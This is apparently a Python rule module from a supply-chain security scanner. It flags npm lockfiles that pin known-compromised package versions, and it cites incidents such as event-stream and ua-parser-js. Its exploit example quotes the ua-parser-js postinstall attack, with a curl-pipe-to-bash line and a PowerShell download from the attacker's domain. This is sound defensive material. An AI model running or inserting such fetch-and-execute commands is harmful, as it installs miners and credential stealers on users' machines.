"""NPM-006, lockfile pins a known-compromised npm package version."""
from __future__ import annotations

from ...base import Finding, Location, Severity, severity_rank
from ...rule import Rule
from .._compromised_packages import lookup
from ..base import NpmLock, iter_lock_packages

RULE = Rule(
    id="NPM-006",
    title="package-lock.json pins a known-compromised package version",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-3", "CICD-SEC-8"),
    esf=("ESF-S-VERIFY-DEPS",),
    cwe=("CWE-829", "CWE-506"),
    recommendation=(
        "Rotate every secret reachable to any process that ran "
        "``npm install`` against this lockfile during the window the "
        "compromised version was installed. Bump the affected "
        "dependency to a post-incident clean version published by "
        "the upstream maintainer (announced in the citing advisory), "
        "regenerate the lockfile, and audit CI build logs for the "
        "exfiltration shape the advisory documents. Pair with NPM-"
        "004 (install-time lifecycle scripts) so the postinstall "
        "primitive most npm compromises rely on is disabled at the "
        "publisher side, and DF-024 (``--ignore-scripts``) so the "
        "image build can't re-enable it."
    ),
    docs_note=(
        "Walks every entry in the lockfile (npm 7+ ``packages`` map "
        "and npm 6 ``dependencies`` tree) against the curated "
        "compromised-package registry in "
        "``pipeline_check.core.checks.npm._compromised_packages``. "
        "Match is case-insensitive on package name and exact on "
        "version literal (with optional regex fallback for advisories "
        "that span a range). Lockfile coverage means both direct "
        "dependencies *and* transitive ones are caught — the more "
        "common attack shape, where ``axios -> plain-crypto-js`` "
        "(March 2026) pulled in a backdoored transitive that the "
        "direct ``package.json`` declaration never mentioned. "
        "Registry is hand-curated and append-only; refresh by PR "
        "with the citing CVE / GHSA / vendor advisory in the commit "
        "message."
    ),
    known_fp=(
        "The registry covers only public, advisory-confirmed "
        "compromises. Pre-disclosure compromises and yet-unpublished "
        "maintainer-account takeovers do not land until the citing "
        "advisory exists. For broader coverage, run ``npm audit`` "
        "or ``osv-scanner`` alongside pipeline-check; NPM-006 is "
        "the curated supply-chain anchor, not a vulnerability "
        "database.",
    ),
    incident_refs=(
        "event-stream 3.3.6 (Nov 2018): canonical npm maintainer-"
        "takeover. The hijacked publisher added a malicious "
        "``flatmap-stream`` transitive that targeted Copay wallet "
        "builds. https://github.com/dominictarr/event-stream/issues/116",
        "ua-parser-js compromise "
        "([CVE-2021-43547](https://nvd.nist.gov/vuln/detail/CVE-2021-43547), "
        "Oct 2021): hijacked maintainer account; the malicious "
        "versions ran a crypto miner + password stealer via "
        "postinstall on every consumer.",
        "coa + rc compromise ([GHSA-73qr-pfmq-6rp8](https://github.com/advisories/GHSA-73qr-pfmq-6rp8), "
        "Nov 2021): coordinated maintainer-account-takeover campaign "
        "hitting two widely-used CLI helpers within hours of each "
        "other.",
    ),
    exploit_example=(
        "# Vulnerable: package-lock.json carries a compromised\n"
        "# version. The current scan flags it because the registry\n"
        "# entry matches the (name, version) tuple.\n"
        "{\n"
        "  \"lockfileVersion\": 3,\n"
        "  \"packages\": {\n"
        "    \"node_modules/ua-parser-js\": {\n"
        "      \"version\": \"0.7.29\",\n"
        "      \"resolved\": \"https://registry.npmjs.org/ua-parser-js/-/ua-parser-js-0.7.29.tgz\",\n"
        "      \"integrity\": \"sha512-...\"\n"
        "    }\n"
        "  }\n"
        "}\n"
        "\n"
        "# Attack: the postinstall on ua-parser-js@0.7.29 fetched a\n"
        "# second-stage payload and ran it with the consumer's npm-\n"
        "# install environment:\n"
        "#   IF (host_os == 'Linux') {\n"
        "#     curl https://citationsherbe.at/sdd.sh | bash;\n"
        "#   } ELSE IF (host_os == 'Windows') {\n"
        "#     Invoke-WebRequest https://citationsherbe.at/sdd.exe ...;\n"
        "#   }\n"
        "# The Linux payload installed XMRig (Monero miner); the\n"
        "# Windows payload installed DanaBot (credential stealer).\n"
        "\n"
        "# Safe: post-incident clean version. ua-parser-js republished\n"
        "# 0.7.30 / 0.8.1 / 1.0.1 with the malicious code removed and\n"
        "# a maintainer-key rotation; pin to those or later."
    ),
)


def _package_name_from_install_path(install_path: str) -> str:
    """Return the npm package name implied by a lockfile install
    path key.

    npm 7+ keys are paths like ``node_modules/foo`` or
    ``node_modules/foo/node_modules/bar`` (transitive). The package
    name is everything after the LAST ``node_modules/`` segment.
    Scoped packages (``@scope/name``) survive the split intact
    because their slash isn't preceded by ``node_modules/``.
    """
    marker = "node_modules/"
    idx = install_path.rfind(marker)
    if idx < 0:
        return install_path
    return install_path[idx + len(marker):]


def check(lock: NpmLock) -> Finding:
    matches: list[str] = []
    locations: list[Location] = []
    advisories: set[str] = set()
    matched_severities: set[Severity] = set()
    for install_path, record in iter_lock_packages(lock):
        version = record.get("version")
        if not isinstance(version, str):
            continue
        name = record.get("name")
        if not isinstance(name, str) or not name:
            name = _package_name_from_install_path(install_path)
        hit = lookup(name, version)
        if hit is None:
            continue
        matches.append(f"{name}@{version}")
        advisories.add(hit.advisory)
        matched_severities.add(hit.severity)
        idx = lock.text.find(f'"{install_path}"')
        line_no = lock.text[:idx].count("\n") + 1 if idx >= 0 else 1
        locations.append(Location(
            path=lock.path, start_line=line_no, end_line=line_no,
        ))
    passed = not matches
    if passed:
        desc = (
            "No lockfile entry matches a known-compromised package "
            "version in the curated registry."
        )
        severity = RULE.severity
    else:
        unique = sorted(set(matches))
        ref_summary = ", ".join(unique[:3])
        if len(unique) > 3:
            ref_summary += f" (+{len(unique) - 3} more)"
        adv_summary = "; ".join(sorted(advisories))
        desc = (
            f"{len(matches)} lockfile entry / entries match a known-"
            f"compromised package version: {ref_summary}. Rotate any "
            f"secret reachable to ``npm install`` runs against this "
            f"lockfile, then update to a post-incident clean version. "
            f"Advisory: {adv_summary}"
        )
        # Per-entry severity wins: a HIGH-only match (protestware like
        # node-ipc) should report HIGH, not the rule-level CRITICAL
        # default. Multiple matches escalate to the most severe.
        severity = max(matched_severities, key=severity_rank)
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=severity,
        resource=lock.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
